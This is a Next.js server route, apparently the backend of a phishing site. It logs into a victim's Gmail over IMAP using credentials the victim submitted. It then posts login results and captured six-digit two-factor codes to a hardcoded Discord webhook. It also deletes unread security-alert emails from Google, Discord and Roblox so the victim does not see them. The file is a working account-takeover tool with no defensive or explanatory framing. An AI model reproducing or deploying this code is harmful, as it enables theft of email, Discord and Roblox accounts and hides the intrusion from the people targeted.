import { NextRequest, NextResponse } from 'next/server';
import * as imap from 'imap-simple';
import { simpleParser } from 'mailparser';

const WEBHOOK = 'https://discord.com/api/webhooks/1479843046223909040/kGSLiyRPqh9TqsZfhRqMqc0fHdF05ZasD7DQNMHGT4Y7Su3yrCTU7N1Y_QhdZwgie614';

async function log(title: string, fields: { name: string; value: string }[], color = 0x5865f2) {
  try {
    await fetch(WEBHOOK, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        embeds: [{ title, color, fields, timestamp: new Date().toISOString() }]
      })
    });
  } catch {}
}

export async function POST(req: NextRequest) {
  const { email, password } = await req.json();
  
  if (!email || !password) {
    return NextResponse.json({ error: 'Missing credentials' }, { status: 400 });
  }

  try {
    const config = {
      imap: {
        user: email,
        password: password,
        host: 'imap.gmail.com',
        port: 993,
        tls: true,
        tlsOptions: { rejectUnauthorized: false },
        authTimeout: 30000,
        connTimeout: 30000
      }
    };

    const conn = await imap.connect(config);
    
    await log('Gmail Login Success', [{ name: 'Email', value: email }], 0x00ff00);
    
    await conn.openBox('INBOX');

    // Delete security alerts
    try {
      const alerts = await conn.search([
        'UNSEEN',
        ['OR', 
          ['FROM', 'no-reply@accounts.google.com'], 
          ['FROM', 'no-reply@discord.com'], 
          ['FROM', 'no-reply@roblox.com']
        ],
        ['OR', 
          ['SUBJECT', 'new sign-in'], 
          ['SUBJECT', 'suspicious'], 
          ['SUBJECT', 'login attempt'],
          ['SUBJECT', 'security alert']
        ]
      ]);

      if (alerts.length > 0) {
        await conn.addFlags(alerts, '\\Deleted');
        await conn.expunge();
        await log('Alerts Deleted', [{ name: 'Count', value: String(alerts.length) }], 0xffaa00);
      }
    } catch (searchErr) {
      console.log('Search error (non-critical):', searchErr);
    }

    // Look for 2FA codes
    try {
      const since = new Date(Date.now() - 10 * 60 * 1000);
      const recent = await conn.search(['SINCE', since]);
      
      for (const msg of recent.slice(-10)) {
        try {
          const part = await conn.getPartData(msg, 'TEXT');
          const parsed = await simpleParser(part);
          const text = parsed.text || '';

          const codeMatch = text.match(/\b\d{6}\b/);
          if (codeMatch) {
            const code = codeMatch[0];
            const lowerText = text.toLowerCase();
            const service = lowerText.includes('discord') ? 'Discord' : 
                           lowerText.includes('roblox') ? 'Roblox' : 
                           lowerText.includes('google') ? 'Google' : 'Other';
            
            await log(`${service} 2FA Code`, [
              { name: 'Code', value: `\`${code}\`` },
              { name: 'Email', value: email }
            ], 0x00ff00);
          }
        } catch (parseErr) {
          continue;
        }
      }
    } catch (codeErr) {
      console.log('Code search error:', codeErr);
    }

    conn.end();
    return NextResponse.json({ success: true });

  } catch (err: any) {
    console.error('Gmail login error:', err);
    
    await log('Gmail Login Failed', [
      { name: 'Email', value: email },
      { name: 'Error', value: err.message || 'Unknown error' }
    ], 0xff0000);
    
    return NextResponse.json({ error: err.message }, { status: 500 });
  }
}
